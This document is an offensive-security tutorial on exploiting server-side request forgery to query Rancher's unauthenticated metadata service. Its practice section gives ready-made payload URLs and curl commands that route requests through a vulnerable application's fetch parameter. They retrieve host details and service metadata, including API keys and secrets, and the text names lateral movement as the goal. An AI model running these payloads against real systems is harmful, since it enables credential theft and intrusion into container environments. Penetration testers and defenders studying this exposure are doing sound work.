---
title: Exploiting Rancher Metadata Service via SSRF
description: Learn how to exploit Rancher metadata services through SSRF for sensitive
  data extraction and potential lateral movement.
keywords:
- Rancher
- SSRF
- metadata service
- container orchestration
- data extraction
- vulnerability exploitation
- Rancher API
- sensitive data
- Rancher security
---

# Rancher

## Context

In this article, we explore the exploitation of Rancher's metadata service via Server-Side Request Forgery (SSRF) attacks. The goal is to extract sensitive data that can potentially allow further lateral movement or privilege escalation. To fully benefit from this guide, readers should have a good understanding of HTTP protocol mechanics, container orchestration fundamentals, general metadata service exploitation, and SSRF attack principles.

## Theory

### Rancher Metadata Service Architecture

Rancher's metadata service provides vital runtime information about containers, hosts, and services to workloads within a Rancher-managed ecosystem. The service is accessible over HTTP at `http://rancher-metadata/` from all containers managed by Rancher. This architecture allows containers to query this metadata API for valuable information regarding environment, service, and credentials.

### Rancher Metadata API Structure and Access

The Rancher metadata API is versioned, such as `/2015-07-25/`, offering various structured metadata endpoints. An attacker can exploit these endpoints via SSRF techniques to access data. Within the container network, these metadata services lack authentication and network isolation, making them a prime vulnerability point for malicious activity.

### Sensitive Data Exposure via Rancher Metadata

The metadata exposed by the Rancher service can include API keys, service credentials, environment variables, and orchestration details, all of which are critical information. Through successful SSRF exploitation, an attacker can extract such data, paving the way for lateral movement within the network or gaining escalated privileges.

## Practice

### SSRF to Rancher Metadata Service for Sensitive Data Extraction

- **Identify Vulnerable Point**: Begin by identifying an SSRF injection point in a web application hosted within a Rancher-managed container. This is often found as a user-controllable URL parameter or HTTP header capable of triggering server-side HTTP requests.

- **Payload Targeting Host Information**:
  ```http
  http://rancher-metadata/2015-07-25/self/host
  ```

  **Command Execution**:
  ```bash
  curl -s 'http://<vulnerable-app>/fetch?url=http://rancher-metadata/2015-07-25/self/host'
  ```
  When executed, this command exploits the SSRF vulnerability to relay a request to the Rancher metadata service.

  **Expected Output**:
  ```json
  {
      "name": "host1",
      "hostname": "host1.example.com",
      "labels": { ... },
      ...
  }
  ```

- **Payload Targeting Service Metadata**:
  ```http
  http://rancher-metadata/2015-07-25/self/service/metadata
  ```

  **Command Execution**:
  ```bash
  curl -s 'http://<vulnerable-app>/fetch?url=http://rancher-metadata/2015-07-25/self/service/metadata'
  ```
  This command is used to further extract service metadata through the SSRF vulnerability.

  **Expected Output**:
  ```json
  {
      "api_key": "RANCHER_API_KEY",
      "secret": "RANCHER_SECRET",
      ...
  }
  ```

These commands demonstrate how an attacker can utilize SSRF to access Rancher's metadata, thereby retrieving sensitive details like API keys or secrets, potentially leading to further network compromise.

## Tools

- **curl**
- **Burp Suite**

Using these tools, a skilled practitioner can identify and exploit SSRF vulnerabilities effectively within Rancher-managed environments, accessing metadata that could be critical for further actions.